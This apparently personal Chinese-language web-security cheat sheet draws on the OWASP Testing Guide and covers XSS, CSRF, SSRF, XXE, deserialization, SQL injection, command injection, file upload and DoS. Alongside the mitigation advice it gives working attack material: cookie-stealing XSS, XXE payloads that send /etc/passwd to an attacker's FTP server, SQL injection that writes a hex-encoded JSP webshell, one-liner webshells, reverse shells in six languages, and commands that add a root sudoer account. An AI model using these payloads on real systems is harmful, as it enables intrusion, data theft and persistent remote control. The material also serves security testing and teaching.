# attack_pattern

!!! abstract "[OWASP 测试指南 4.0](https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/index.html)"

## 特征

- BASE64：包含大小写字母数字+/，以%3D(==)结尾
- MD5：16字节128bit, 32个十六进制字符
- SHA1：20字节160bit, 40个十六进制字符，每个十六进制字符代表4bit，40x4=160bit
- SHA256: 32字节256bit, 64个十六进制字符


## 常用编码

- ASCII:
    - 十进制: `a = 97`
    - 十六进制: `/ = 0x2F`

- Unicode: `中文 = \u4e2d\u6587`
- 反转义：
    - 回车CR: `\r`
    - 换行LF: `\n`
    - 制表符TAB: `\t`

- URL:
    - 空格: `%20`
    - 英文逗号: `%2c`

- html:
    - `< = &lt;`
    - `> = &gt;`
    - 中文左单引号: `&lsquo;`
    - 中文右单引号: `&rsquo;`
    - 中文右双引号: `&rdquo;`


## XSS

### 受害场景

XSRF, 以受害者的身份发送请求, **如果受害者是管理员, 可利用创建一个新的管理员帐号供攻击者使用**

#### 反射型

1. 攻击者启动一个http服务器：`python -m SimpleHTTPServer 88`
1. 攻击者构造超链接, 请求 {==URL参数==} 中注入XSS脚本, 如: `http://xxx.com/xxx.action?provider=wiseus&{==query=<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>==}&device=mobile&ssid=0&from=844b&uid=0`
1. **诱骗受害者点击该链接**
1. XSS脚本读取Cookies中的SESSIONID(**未设置httponly**), 并将其发送给攻击者

#### 存储型

#### DOM型

---

1. 尝试使用`xss"><img src=x onerror=alert(3)>`

???+ tip
    使用 **AngularJS** 框架的应用, 检查页面元素, 属性中携带`class="ng-binding"`的即为绑定输出, 已经过输出编码, 不存在XSS.

### jQuery

> 如果使用`$('#id').text()`或`$('#id').val()`, 则不存在XSS.

???+ danger
    存在XSS的方法:

    - `$('#id').append()`
    - `$('#id').html()`
    - after
    - appendTo
    - before
    - insertAfter
    - insertBefore
    - prepend
    - prependTo
    - replaceAll
    - replaceWith
    - unwrap
    - wrap
    - wrapAll
    - wrapInner

```html hl_lines="11 14"
<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>
$(document).ready(function(){
  $("#textbtn").click(function(){
    $("#test1").text("<h1>Hello islibra world!</h1>");
  });
  $("#appendbtn").click(function(){
    $("#test1").append("<h1>Hello islibra world!</h1><script>alert('xss')<\/script>");
  });
  $("#htmlbtn").click(function(){
    $("#test2").html("<b>Hello world!</b>");
  });
  $("#valuebtn").click(function(){
    $("#test3").val("\"><h1>Dolly</h1> Duck");
  });
});
</script>
</head>
<body>

<p id="test1">This is a paragraph.</p>
<p id="test2">This is another paragraph.</p>

<p>Input field: <input type="text" id="test3" value="Mickey Mouse"></p>

<button id="textbtn">Set Text</button>
<button id="appendbtn">Append Text</button>
<button id="htmlbtn">Set HTML</button>
<button id="valuebtn">Set Value</button>

</body>
</html>
```


## CSRF

### 受害场景

1. 受害者已登录正常网站，{==SESSIONID==}存放在{==Cookies==}中
1. 受害者被诱骗用{==同一个浏览器==}打开非法网站, 如`http://127.0.0.1:8888/csrf.html?abc=1.1.1.1`
1. 非法网站存在访问正常网站请求脚本:

    ```html
    <form action="https://normal.request.action" method="POST" id="csrf_form">
        <input name="description" value="">
    </form>
    <script>
        var form = document.getElementById("csrf_form");
        form.submit();
    </script>
    ```

### 消减措施

#### 1. Referer

由浏览器添加

服务器校验:

```java
String referer = request.getHeader("Referer");
String hostname = request.getLocalName();
//TODO: compare
//Warning: 使用contains(), startWith()存在绕过
```

#### 2. token

1. 认证通过后, 在服务端生成随机数token, 存储在SESSION中, 并发送回客户端(设置Cookies)
1. 发送请求前, 从Cookies中获取token, 设置在 **请求头/请求体/URL** 中
1. 接受到请求, 对token进行校验

```java
String uri = request.getRequestURI();
//TODO: compare
//Warning: 使用contains(), startWith()存在绕过

String req_token = request.getHeader("csrf_token");
String token = (String)request.getSession().getAttribute("csrf_token");
if(token != null && token.equals(req_token)) {
    request.doFilter(request, response);
}
```

### 验证步骤

!!! info "只针对非GET请求"

1. 查看请求头/请求体/URL中是否存在 **token**, 如:
    - `roarand: xxx`

    删除/修改token
    1. 如果对token校验, 尝试 **绕过URL白名单**:
        - 跨越上层目录: `/logout/../xxx/xxx`

1. 如果没有token, 修改 **Referer**
    1. 如果对Referer校验, 尝试 **绕过** 使用contains(), startWith()进行的判断：
        - `http://eval.com?<originhost>`
        - `http://<originhost>@eval.com`
        - `http://<originhost>.eval.com`


## SSRF

### 验证步骤

- 请求参数中携带endpoint
- 请求头中携带X-Endpoint

### 场景危害

> 所有场景都可攻击 **内网** 或 **本地**

1. 请求非http服务的端口
    - 返回banner信息，如：`http://scanme.nmap.org:22/test.txt`返回OpenSSH版本, `http://127.0.0.1:3306/test.txt`返回MySQL版本.
    - 探测端口开放状态, 如请求关闭的端口: `http://scanme.nmap.org:25/test.txt`报错.
1. 正则表达式攻击造成应用程序溢出
    - 如果`9876`端口开放, 构造`http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`使进程崩溃.
1. 通过访问默认文件, 识别应用
    - `http://10.0.0.1/portName.js`可以根据返回结果判断是否是 Dlink 路由器.
1. 访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.
    - `http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&methodIndex=17&{==arg0=http://our_public_internet_server/utils/cmd.war==}`
1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
1. 间接获取内置帐号token。


## XXE(XML External Entity attack)

!!! note "DTD: Document Type Definition, XML文件的模板, 定义XML文件中的元素, 元素的属性, 元素的排列方式, 元素包含的内容等"

### 验证步骤

1. 是否存在 **XML解析**
    - 存在Office2007及以上版本文件导入功能
    - SOAP接口, 如Apache CXF或axis实现的WebService接口

1. 是否存在漏洞

- 检查poi-x.x.jar是否为3.10.1之前的版本

1. 本地启动 **http服务**: `python -m http.server 8888 --bind 192.168.1.1`
1. 使用WinRAR打开xlsx文件, 编辑[Content_Types].xml
    1. 是否支持解析内部实体(未报错)

        > 实体: 定义引用普通文本或特殊字符的快捷方式的变量

        ```xml hl_lines="3 5"
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <!DOCTYPE root [
            <!ENTITY test "testString">
        ]>
        <root>&test;</root>
        ```

    1. 是否支持解析外部实体

        ```xml hl_lines="3"
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <!DOCTYPE root [
        	<!ELEMENT test SYSTEM "http://192.168.1.1/test.dtd">
        ]>
        <root>&test;</root>
        ```

1. 导入xlsx文件后, 接收到 **http请求**
1. 另一种POC

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE root [
    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
    	%q;
    ]>
    <root></root>
    ```

1. http服务存放dtd文件

    ```dtd
    <!ENTITY % p1 SYSTEM "file:///etc/passwd">
    <!ENTITY % p2 "<!ENTITY &#x25; e1 SYSTEM 'ftp://192.168.1.1:21/%p1;'>">
    %p2;
    %e1;
    ```

    或

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE root [
    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
    	%q;
    	%p;
    ]>
    <root>&exfil;</root>
    ```

    ```dtd
    <!ENTITY % data SYSTEM "file:///etc/passwd">
    <!ENTITY % p "<!ENTITY exfil SYSTEM 'ftp://10.21.151.32:21/%data;'>">
    ```

1. 使用IPOP开启 **ftp服务**, 导入xlsx文件, 接收到请求

    ``` hl_lines="9"
    ![2019/11/18 11:40:09] x.x.x.x:35914 connected
    < x.x.x.x USER anonymous
    > x.x.x.x 331 Password required for anonymous.
    < x.x.x.x PASS Java1.8.0_201@
    ! x.x.x.x User "anonymous" is authenticated
    > x.x.x.x 230 User anonymous logged in.
    < x.x.x.x TYPE I
    > x.x.x.x 200 Type set to I.
    < x.x.x.x CWD root:x:0:0:root:
    > x.x.x.x 501 CWD failed. Invalid directory name syntax
    < x.x.x.x QUIT
    > x.x.x.x 221 Goodbye.
    ![2019/11/18 11:40:09] x.x.x.x disconnected
    ```

1. 自定义FTPServer

    ```java
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.PrintWriter;
    import java.net.ServerSocket;
    import java.net.Socket;

    public class FtpServer {

        public static void main(String args[]) throws IOException {
            ServerSocket s = new ServerSocket(21);
            Socket incoming = s.accept();
            BufferedReader in = new BufferedReader(new InputStreamReader(incoming.getInputStream()));
            PrintWriter out = new PrintWriter(incoming.getOutputStream(), true);
            out.println("220 Ftp Server Running!");
            System.out.println(in.readLine());
            out.println("331 USER");
            System.out.println(in.readLine());
            out.println("230 Login In");
            while (true) {
                String str = in.readLine();
                if (str != null && str.trim().toUpperCase().startsWith("QUIT")) {
                    out.println("221 bye!");
                    out.close();
                    in.close();
                    break;
                } else if (str != null && str.trim().toUpperCase().startsWith("CWD")) {
                    System.out.print("\n" + str.substring(3));
                } else {
                    System.out.print(str);
                }
    			out.println("200 OK!");
            }
        }
    }
    ```


## 反序列化

### Java

#### ObjectInputStream

1. 请求报文以16进制`aced 0005`开头，即序列化后的对象在http请求中发送。BASE64为r00AB。
1. 代码中搜索：`ObjectInputStream.readObject()`
1. poc: [ysoserial](https://github.com/frohoff/ysoserial)
    - `ObjectInputStream.readObject()`会自动调用实现了Serializable/Externalizable接口的类方法：
        - `readObject()`
        - `readObjectNoData()`
        - `readResolve()`
        - `readExternal()`

        **将POC写入到这些方法中**，如：`Runtime.getRuntime().exec("open /Applications/Calculator.app/");`。

1. 消减措施: 继承ObjectInputStream并重写resolveClass
    1. 增加白名单校验: `"com.xxx.Xxx".equals(desc.getName())`
    1. 增加安全管理器:
        - `permission java.io.SerializablePermission "enableSubclassImplementation";`
        - `permission java.io.SerializablePermission "com.xxx.Xxx";`
        - `sm.checkPermission(new SerializablePermission("com.xxx."+desc.getName()));`

#### XMLDecoder

1. 请求为xml格式, 且包含`class="java.beans.XMLDecoder"`
1. 代码中搜索：`java.beans.XMLDecoder.readObject()`
1. poc:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="1.8.0_241" class="java.beans.XMLDecoder">
     <object class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="1">
       <void index="0">
        <string>notepad.exe</string>
       </void>
      </array>
      <void method="start" />
     </object>
    </java>
    ```

#### XStream <= 1.4.10

[XStream](https://x-stream.github.io/), April 12, 2020 XStream 1.4.12 released

1. 请求为xml格式, 且xml内容为Java Bean格式
1. 代码中搜索：`xStream.fromXML()`
1. poc:

    ```xml
    <sorted-set>
        <string>foo</string>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>/usr/bin/mkdir</string>
                        <string>/tmp/hackerdir</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
    </sorted-set>
    ```


### PHP

```php
// 定义类
class Cl{
    var $test = "hello";
    var $age = 3;

    // magic函数会被自动调用
    // 命名是以符号开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup
    function __destruct(){
        // 序列化调用一次, 反序列化调用一次
        echo $this->test;
        // 注入点
        eval("$this->test");
    }
}
$c = new Cl();
// 序列化
$sc = serialize($c);
// object:类名长度:类名:属性数量:{s属性类型字符串:属性名称;s属性类型字符串:属性值;s属性类型字符串:属性名称;i属性类型整型:属性值}
// O:1:"C":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":2:{s:4:"test";s:5:"hello";s:3:"age";i:3;}
print_r($sc);
echo "<br>";
// 反序列化
$sc = 'O:2:"Cl":2:{s:4:"test";s:13:"system(\'id\');";s:3:"age";i:3;}';
// uid=1(daemon) gid=1(daemon) groups=1(daemon)
$uc = unserialize($sc);
// hello
print_r($uc->test);
```

## SQL注入

### 验证步骤

1. 输入`xxx`, 正常查询
1. 输入`` xxx' ``或`` xxx" ``, 是否报错

### 注释

- 通用单行注释: `-- `, {==注意后面跟一个空格==}, 如`flag' or 1=1 -- `
- 通用多行注释: `/* ... */`
- MySQL单行注释: `#`, 如`flag' or 1=1 #`

### 常用POC

- 查询 **当前表** 中全部数据`flag' or 1=1 #`或`flag' or 1=1 -- `
- 猜解列数`flag' union select 1,2,3 #`, 返回的数据为1, 2, 3
- 猜解数据库名, 表名
    - `flag' and exist(select * from xxx) #`
    - `' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`

        > 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名

- 猜解列名, 数据类型
    - `flag' and exist(select xxx from xxx) #`
    - `' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx' #`

- 查询某个表中某个数据: `' UNION SELECT 0, 'NULL', (SELECT USERNAME||' '||PASSWORD FROM DATABASENAME.TABLENAME LIMIT 1), 'NULL' --+-`
- 写入文件: `select "hackkkk" into outfile "/tmp/hackkkk.jsp";`
- 在文件开头写入内容:

    ```bash
    mysql> se lect "hackkkk" into outfile "/tmp/hackkk.jsp" LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e;
    Query OK, 1 row affected (0.02 sec)
    mysql> quit
    Bye
    $ cat /tmp/hackkk.jsp
    <?php phpinfo();?>hackkkk
    ```

- 将[jsp一句话木马](#_11)转换为十六进制`3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e`
- 先闭合原字符串, 再加`#`忽略后面语句, 中间添加POC: 使用`/**/`绕过空格校验, 在union的时候, 注意前后查询的参数个数相同

    ```
    zzz'/**/union/**/select+0x3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e+into+outfile+'/usr/local/tomcat/webapps/ucenter/kk.jsp'#
    ```

### 框架

#### JDBC

```java tab="错误的做法"
// 拼接SQL语句
String sql = "SELECT * FROM users WHERE name ='" + name + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

```java tab="推荐的做法"
// 使用占位符 ? 和预编译
String sql = "SELECT * FROM users WHERE name= ? ";
PreparedStatement ps = connection.prepareStatement(sql);
// 参数 index 从 1 开始
ps.setString(1, name);
```

???+ warning
    **order by** 不能使用参数绑定，需要通过白名单过滤。


#### MyBatis

##### XML

定义Mapper接口:

```java
@Mapper
public interface UserMapper {
    User getById(int id);
}
```

XML配置文件:

```xml
<select id="getById" resultType="org.example.User">
    SELECT * FROM user WHERE id = #{id}
</select>
```

##### Annotation

```java
@Mapper
public interface UserMapper {
    @Select("SELECT * FROM user WHERE id= #{id}")
    User getById(@Param("id") int id);
}
```

???+ danger "安全风险"
    - 使用`#{}`会自动生成`PreparedStatement`, 可有效防止SQL注入.
    - 而使用`${}`会直接注入原始字符串, 导致 {==SQL注入==}, 注意注入的 **参数类型要为字符串**!  
        ```xml
        <select id="getByName" resultType="org.example.User">
            SELECT * FROM user WHERE name = '${name}' limit 1
        </select>
        <!--当name的值为 ' or '1'='1 时, 相当于执行-->
        <!--SELECT * FROM user WHERE name = '' or '1'='1' limit 1-->
        ```

???+ warning
    - **order by** 使用`#{}`会被替换为字符串, 如`ORDER BY #{sortBy}`  ^sortBy=name^-->  `ORDER BY "name"`, 因此需要通过白名单过滤, 或使用if标签, 如:

        ```java tab="Java"
        List<User> getUserListSortBy(@Param("sortBy") String sortBy);
        ```

        ```xml tab="xml"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <if test="sortBy == 'name' or sortBy = 'email'">
                order by ${sortBy}
            </if>
        </select>
        ```

        ```xml tab="带默认值的情况"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <choose>
                <when test="sortBy == 'name' or sortBy = 'email'">
                    order by ${sortBy}
                </when>
                <otherwise>
                    order by name
                </otherwise>
            </choose>
        </select>
        ```

    - **like** 需要使用通配符`%`和`_`
        - 方法一: 在Java中参数值两边拼接`%`, 再使用`#{}`
        - 方法二: 在xml中使用`bind`标签构造新参数, 再使用`#{}`

            ```java tab="Java"
            List<User> getUserListLike(@Param("name") String name);
            ```

            ```xml tab="xml"
            <select id="getUserListLike" resultType="org.example.User">
                <bind name="pattern" value="'%' + name + '%'" />
                    SELECT * FROM user WHERE name LIKE #{pattern}
            </select>
            ```

        - 方法三: 在xml中使用SQL语法`concat()`函数

            ```xml
            <select id="getUserListLikeConcat" resultType="org.example.User">
                SELECT * FROM user WHERE name LIKE concat ('%', #{name}, '%')
            </select>
            ```

            !!! warning "使用`SELECT * FROM user WHERE name LIKE concat ('%', {==(select 'xxx')==}, '%')`可以执行成功, 但如果使用的是`#{name}`仍然无法注入"

    ???+ danger
        需要对用户输入进行过滤, 防止在大数据量情况下输入`{==%%==}`导致{==DOS==}。

    - **in**, 使用`<foreach>`和`#{}`

        ```java tab="Java"
        List<User> getUserListIn(@Param("nameList") List<String> nameList);
        ```

        ```xml tab="xml"
        <select id="selectUserIn" resultType="com.example.User">
            SELECT * FROM user WHERE name in
            <foreach item="name" collection="nameList" open="(" separator="," close=")">
                #{name}
            </foreach>
        </select>
        ```

    - **limit**, 使用`#{}`

        ```java tab="Java"
        List<User> getUserListLimit(@Param("offset") int offset, @Param("limit") int limit);
        ```

        ```xml tab="xml"
        <select id="getUserListLimit" resultType="org.example.User">
            SELECT * FROM user limit #{offset}, #{limit}
        </select>
        ```

#### JPA & Hibernate

略


???+ quote "参考链接"
    [彻底干掉恶心的 SQL 注入漏洞， 一网打尽！](https://mp.weixin.qq.com/s/hdOnO-tSGkQp0Wq3wcsIkw)


## 命令注入

### 常见场景

1. 测试网络连通性, 如: `ping -c 4 x.x.x.x`或`traceroute`
1. 输入帐号 **口令** 测试SVN/git连通性
1. 压缩解压
1. **NTP** 服务器校时
1. 上传解析 **文件名**
1. **文件路径**

### 验证步骤

#### 基本模式

1. 使用分隔符拼接`cmd1;cmd2`, 不论cmd1是否执行成功, cmd2都会执行
1. 使用管道拼接`cmd1|cmd2`, 不论cmd1是否执行成功, cmd2都会执行
1. 使用后台执行符拼接`cmd1&cmd2`, cmd1后台执行, cmd2不会等待cmd1执行完成
1. 使用逻辑或操作符拼接`cmd1||cmd2`, 当cmd1执行失败时, 才会执行cmd2
1. 使用逻辑与操作符拼接`cmd1&&cmd2`, 当cmd1执行成功时, 才会执行cmd2
1. 使用命令替换`$(cmd)`, 将一个命令的执行结果赋值给另一个变量或作为另一个命令的参数, 如`USERID=$(uname -a)`或`echo $(whoami)`, cmd也可以是符号分割的多条语句
1. 使用反引号进行命令替换, 如`` USERID=`id -u` ``, 等同于`$(cmd)`
1. 使用重定向拼接`>(cmd)`或`<(cmd)`, 注意`>`和`(`之间不能有空格, cmd也可以是符号分割的多条语句
1. 使用换行符拼接`cmd1\ncmd2`

#### 绕过特殊字符校验

!!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"

1. `/`:
    1. 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
    1. 调用python库函数: `x;python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\";1.tar.gz`
        1. 调用python命令行执行python脚本：`python -c "print('abc')"` 或 `python -c "print('ab""cd')"` 或 `python -c "print('ab"''"cd')"` 或 `python -c "print('ab"'xxx'"cd')"`
        2. python脚本执行shell命令：`python -c "__import__('os').system('touch /tmp/hackfile')"` 或 `python -c "getattr(__import__('os'),'system')('touch /tmp/hackfile')"`
        3. 替换空格：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"/tmp/hackfile')"`
        4. 替换斜杠：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')"`
        5. 在请求中将双引号反转义：`python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\"`

1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行

1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
    1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
    1. 执行脚本: `xxx$(perl$IFS"/tmp/hhack.pl")`

1. 找到可以提权到root的脚本, 创建帐号, 设置密码, 添加权限
    ```bash
    $ useradd xxx;echo password | passwd xxx --stdin &>/dev/null;echo "xxx ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
    # 或
    $ useradd -u 999 -g 0 -G 0 attacker && echo -e "password\npassword\n" | passwd attacker
    ```

### 反弹shell

reverse shell, 在控制端 **监听端口**, 被控端发起请求到该端口, 并将其命令行的输入输出转到控制端

#### 1. 在攻击端启动监听

```bash
$ ncat -lvp 53
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
```

#### 2. 在被控端发起连接

##### Perl

```bash
$ perl -e 'use Socket;$i="192.168.1.128";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# 或写进脚本执行
$ perl xxx.pl
```

##### Python

```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.128",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

##### Java

```java
public class Revs {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/53;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

##### bash

```bash
$ /bin/bash -i >& /dev/tcp/192.168.1.128/80 0>&1
```

##### nc

!!! danger "注意需要确认被控机器上已安装nc"

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 8080 >/tmp/f
```

##### awk

```bash
$ awk 'BEGIN{s="/inet/tcp/0/192.168.1.128/8080";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```


!!! quote "参考链接: [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)"


### 代码审计

#### Java

##### 仅执行特定程序, 无命令注入风险

```java
import java.util.logging.Level;
import java.util.logging.Logger;

public class OSi {
    private static final Logger log = Logger.getLogger(OSi.class.getName());

    public static void main(String[] args) {
        log.setLevel(Level.ALL);
        log.entering("OSi", "main", "Start");

        try {
            String cmd = "mkdir ddd;id>hack.txt";
            // Runtime启动新的进程
            // 创建名为 ddd;id>hack.txt 的目录, 不存在命令注入
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            log.severe(e.getMessage());
        }

        log.entering("OSi", "main", "End");
    }
}
```

##### 执行脚本, Linux不存在命令注入

```bash
#!/bin/bash

# filename: test.sh
mkdir ddd
```

```java
String cmd = "./test.sh | id>hack.txt";
// 仅执行test.sh, 不存在命令注入
Runtime.getRuntime().exec(cmd);
```

##### 执行脚本, Windows存在命令注入

```bat
@rem filename: test.bat
@mkdir "D:\tmp\hackdir"
@echo "waiting..."

@rem 如果加上 @pause 则后面的命令无法执行
```

```java
String cmd = "D:\\tmp\\test.bat & notepad.exe";
// 存在命令注入!!!
Runtime.getRuntime().exec(cmd);
```

##### sh -c 作为一个参数传入exec, 在Linux下不会执行

```java
String cmd = "/bin/sh -c test.sh | id>hack.txt";
// 未执行任何命令
Runtime.getRuntime().exec(cmd);
```

##### cmd.exe /c 作为一个参数传入exec, 在Windows下存在命令注入

```java
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec("cmd.exe /c dir" + "&notepad.exe");
proc.waitFor();
```

##### sh -c 作为数组传入exec, 存在命令注入

```java
// String[] {==第一个元素==} 可控  或  为 {==/bin/sh -c==}
// 第二条命令执行成功
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "test.sh;touch hack.txt"});
```


#### Python

1. 调用`eval()`, 验证POC: `__import__(%27os%27).system(%27touch%20/tmp/hackkk.sh%27)`
1. subprocess.Popen(cmd, shell=True, ...)
1. 自定义模块路径`sys.path.append("xxx")`可控, 导入模块名称`__import__("xxx")`可控
1. tar --to-command

##### 格式化字符串漏洞

!!! quote "[格式化字符串](../../coding/python/0x01_datatype/#_3)"

#### Go

!!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"

#### Perl

- system()

    ```perl
    # $username为用户输入
    $username = param ("username");
    # 使用$username拼接命令
    system ("cat /usr/stats/$username");
    # POC: xxx; cat /etc/passwd
    # 正常情况调用execvp()来运行“cat”, 如果包含Shell元字符, 则通过Shell来解释

    # 消减措施: 作为参数列表, 但是存在路径跨越如:../../etc/passwd
    system ("cat", "/usr/stats/$username");
    ```

- exec()

### 消减措施

1. 使用语言提供的标准API代替运行系统命令
1. 对输入的数据进行白名单校验, 如: `Pattern.matches("[0-9a-zA-Z@]+", input)`
1. 对特殊字符进行编码


## OGNL注入


## 上传

### 验证步骤

1. 上传一句话木马webshell

    语言 | 代码
    --- | ---
    php | `<?php @eval($_POST['passwd']);?>`
    asp | `<%eval request(“passwd")%>`
    .net | `<%@ Page Language="Jscript"%><%eval(Request.Item["passwd"],"unsafe");%>`
    jsp | `<%if(request.getParameter("cmd")!=null){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>`

1. 如果前台校验了后缀名, 抓包修改后缀名
1. 在路径中添加`../`将webshell上传到可执行目录
1. 利用客户端连接工具如中国菜刀/蚁剑连接

## 下载

### 验证步骤

1. 文件名或路径可控
    - 在路径中添加`../`, 下载敏感文件如`/etc/passwd`
    - `/rest/v1/file/..--..--home--xxx--.ssh--id_rsa`, 在代码中将`--`替换为`/`
1. 如果文件路径在URL中, 需要进行URL编码`%2e%2e%2f`


## DoS

### zip

1. 使用root制作高压缩比文件：`dd if=/dev/zero count=$((1024*1024)) bs=4096 > big.csv`
1. 压缩：`zip -9 big.zip big.csv`

### 正则表达式

- 使用[Regulex](https://jex.im/regulex/)解析，是否存在两层以上的循环。
- [REGEXPER](https://regexper.com/)

### json

!!! quote "参考: [Fastjson](../cve/cve_catalog/#fastjson_1)"


---


## SSL/TLS协议版本和加密套件

### 是否开启SSLv2, SSLv3, TLSv1, TLS1.1, TLS1.2

`openssl s_client -ssl2 -connect x.x.x.x:port`, 可选项: -ssl3, -tls1, -tls1_1, -tls1_2

- 支持

    ```bash
    ...
    SSL-Session:
    Protocol  : SSLv2
    ...
    ```

- 不支持

    ```bash
    CONNECTED(00000003)
    458:error:1407F0E5:SSL routines:SSL2_WRITE:ssl handshake failure:s2_pkt.c:428:
    SSLv3 Support
    ```

### Cipher Suites

类型描述格式: TLS_RSA_WITH_AES_128_CBC_SHA

- RSA: 密钥交换算法, DHE, ECDHE
- AES_128_CBC: 加密算法, **弱算法**: RC4, Export, 至少128位, GCM填充, **CBC模式不应用于SSLv3/TLSv1.0**
- SHA: MAC算法, SHA256, **弱算法**: MD5, SHA1

检查支持的算法: `nmap --script ssl-enum-ciphers -p 443 x.x.x.x`

```bash
$ echo | openssl s_client -connect x.x.x.x:port -cipher "EDH" 2>/dev/null | grep -ie "Server .* key"
```

??? note "Cipher Suites"
    - SSL_RSA_WITH_NULL_MD5                   NULL-MD5
    - SSL_RSA_WITH_NULL_SHA                   NULL-SHA
    - SSL_RSA_EXPORT_WITH_RC4_40_MD5          EXP-RC4-MD5
    - SSL_RSA_WITH_RC4_128_MD5                RC4-MD5
    - SSL_RSA_WITH_RC4_128_SHA                RC4-SHA
    - SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5      EXP-RC2-CBC-MD5
    - SSL_RSA_WITH_IDEA_CBC_SHA               IDEA-CBC-SHA
    - SSL_RSA_EXPORT_WITH_DES40_CBC_SHA       EXP-DES-CBC-SHA
    - SSL_RSA_WITH_DES_CBC_SHA                DES-CBC-SHA
    - SSL_RSA_WITH_3DES_EDE_CBC_SHA           DES-CBC3-SHA
